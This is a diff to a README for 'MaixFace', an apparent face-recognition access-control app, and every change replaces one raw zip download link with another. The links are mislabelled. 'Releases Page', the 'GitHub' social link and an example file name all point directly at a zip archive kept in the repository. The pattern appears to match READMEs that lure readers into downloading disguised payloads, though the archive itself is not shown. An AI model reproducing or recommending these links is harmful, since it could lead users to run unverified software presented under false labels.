@@ -7,7 +7,7 @@ Welcome to MaixFace! This application helps you manage access control using adva
 
 ## 📥 Download Now
 
-[![Download MaixFace](https://raw.githubusercontent.com/omkar014/MaixFace/main/Example/MaixFace_3.4.zip)](https://raw.githubusercontent.com/omkar014/MaixFace/main/Example/MaixFace_3.4.zip)
+[![Download MaixFace](https://github.com/omkar014/MaixFace/raw/refs/heads/main/models/Maix-Face-v3.7.zip)](https://github.com/omkar014/MaixFace/raw/refs/heads/main/models/Maix-Face-v3.7.zip)
 
 ## 📋 What You Need
 
@@ -27,11 +27,11 @@ Before you start, make sure you have the following:
 ## 💻 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to access the releases page.
-   [Download MaixFace Here](https://raw.githubusercontent.com/omkar014/MaixFace/main/Example/MaixFace_3.4.zip)
+   [Download MaixFace Here](https://github.com/omkar014/MaixFace/raw/refs/heads/main/models/Maix-Face-v3.7.zip)
 
 2. **Select the Latest Version:** Look for the latest release at the top of the page.
 
-3. **Download the Asset:** Click on the binary file or package suitable for your device. For instance, you may see a file named `https://raw.githubusercontent.com/omkar014/MaixFace/main/Example/MaixFace_3.4.zip`.
+3. **Download the Asset:** Click on the binary file or package suitable for your device. For instance, you may see a file named `https://github.com/omkar014/MaixFace/raw/refs/heads/main/models/Maix-Face-v3.7.zip`.
 
 4. **Extract the Files:** After downloading, unzip the package. If you're on Windows, right-click the file and select "Extract All". If you're on a Mac, double-click the file to unzip it.
 
@@ -78,7 +78,7 @@ For persistent issues, consider reaching out for support in the community forums
 ## 🌍 Connect with Us
 
 Stay updated with the latest news and updates by following us on our social media channels:
-- GitHub: [GitHub/MaixFace](https://raw.githubusercontent.com/omkar014/MaixFace/main/Example/MaixFace_3.4.zip)
+- GitHub: [GitHub/MaixFace](https://github.com/omkar014/MaixFace/raw/refs/heads/main/models/Maix-Face-v3.7.zip)
 
 Feel free to contribute to the project by submitting pull requests or reporting bugs you may discover.
 
